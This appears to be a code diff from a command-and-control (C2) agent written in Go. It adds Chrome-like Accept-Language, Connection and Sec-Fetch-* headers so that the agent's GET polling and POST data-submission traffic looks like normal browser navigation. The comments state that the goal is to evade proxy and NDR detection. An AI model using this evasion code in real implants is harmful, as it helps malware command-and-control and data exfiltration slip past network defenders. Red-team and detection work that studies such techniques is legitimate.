@@ -97,3 +97,36 @@ const chromeAcceptHeader = "text/html,application/xhtml+xml,application/xml;q=0.
 // chromeAcceptEncoding includes Brotli (br) which all modern browsers support since 2017.
 // Missing br in Accept-Encoding is a strong signal of non-browser traffic.
 const chromeAcceptEncoding = "gzip, deflate, br"
+
+// chromeAcceptLanguage is the default Accept-Language sent by a US-English Chrome install.
+const chromeAcceptLanguage = "en-US,en;q=0.9"
+
+// chromeConnectionHeader is the Connection header value sent by Chrome on HTTP/1.1.
+const chromeConnectionHeader = "keep-alive"
+
+// generateSecFetchHeaders returns the four Sec-Fetch-* headers that Chrome 80+
+// attaches to every navigation request. Their absence is a trivial non-browser
+// traffic signature detectable by any proxy or NDR solution.
+//
+// Chrome distinguishes between:
+//   - Top-level navigation (user typing URL / direct link): Sec-Fetch-Site: none
+//   - Same-origin form submission (POST from an already-loaded page): Sec-Fetch-Site: same-origin
+//
+// The agent uses "none" for GET (polling) requests and "same-origin" for POST
+// (data submission) requests to mimic a form-based web application workflow.
+// Custom headers from the C2 profile can override these values.
+func generateSecFetchHeaders(method string) map[string]string {
+	headers := map[string]string{
+		"Sec-Fetch-Mode": "navigate",
+		"Sec-Fetch-User": "?1",
+		"Sec-Fetch-Dest": "document",
+	}
+	if method == "POST" {
+		// POST requests simulate a form submission from the same origin
+		headers["Sec-Fetch-Site"] = "same-origin"
+	} else {
+		// GET requests simulate direct top-level navigation (user typing the URL)
+		headers["Sec-Fetch-Site"] = "none"
+	}
+	return headers
+}
